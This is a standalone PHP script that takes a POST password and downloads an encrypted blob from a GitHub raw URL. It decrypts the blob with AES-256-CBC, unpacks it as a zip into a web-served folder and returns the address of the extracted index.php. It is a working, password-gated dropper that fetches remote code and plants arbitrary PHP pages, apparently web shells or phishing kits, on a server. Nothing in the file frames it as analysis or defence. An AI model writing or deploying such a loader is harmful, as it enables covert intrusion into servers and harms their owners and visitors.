<?php


header('Content-Type: application/json');



if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST['password'])) {
        $received_password = $_POST['password'];
		
		function fetch_encrypted_data() {
			$url = 'https://raw.githubusercontent.com/youngkmd/youngkmd/main/upyoung.txt'; 
			$encrypted_data = file_get_contents($url);
			return trim($encrypted_data); 
		}
		
  
		$encryptedData = fetch_encrypted_data();
		
        function generateKeyFromPassword($password, $salt) {
            $key = hash_pbkdf2("sha256", $password, $salt, 1000, 32);
            return $key;
        }

        function decryptData($data, $password) {
            if (empty($password)) {
                return json_encode(array("status" => "error", "message" => "Error: Password not specified"));
            }

            $data = base64_decode($data);
            $salt = substr($data, 0, 16);
            $iv = substr($data, 16, 16);
            $encrypted = substr($data, 32);

            $key = generateKeyFromPassword($password, $salt);

            $decrypted = openssl_decrypt($encrypted, 'aes-256-cbc', $key, 0, $iv);

            return $decrypted !== false ? $decrypted : "error when trying to decode";
        }

        $decryptedData = decryptData($encryptedData, $received_password);
		$filePath = 'encrypted_data.txt';
        file_put_contents($filePath, $decryptedData);

        if (strpos($decryptedData, "error") !== false) {
            echo json_encode(array("status" => "error", "message" => $decryptedData));
        } else {
            $binaryContent = hex2bin($decryptedData);
            $tempFile = tempnam(sys_get_temp_dir(), 'zip_temp_');
            file_put_contents($tempFile, $binaryContent);
            $extractToFolder = uniqid('file_content_');
            $zip = new ZipArchive;

            if ($zip->open($tempFile) === true) {
                if (!is_dir($extractToFolder)) {
                    mkdir($extractToFolder, 0755, true);
                }

                $zip->extractTo($extractToFolder);
                $zip->close();
                $scriptPath = pathinfo($_SERVER['PHP_SELF'], PATHINFO_DIRNAME);
                $serverAddress = $_SERVER['HTTP_HOST'];
                $extractedFolderName = basename($extractToFolder);
                $url = 'http://' . $serverAddress . $scriptPath . '/' . $extractedFolderName . "/index.php";

                echo json_encode(array("status" => "success", "url" => $url));
            } else {
                echo json_encode(array("status" => "error", "message" => "Failed to decompress"));
            }
            unlink($tempFile);
        }
    } else {
        echo json_encode(array("status" => "error", "message" => "SEND YOUR PASSWORD"));
    }
} else {
    echo json_encode(array("status" => "error", "message" => "BAD REQUEST"));
}
?>
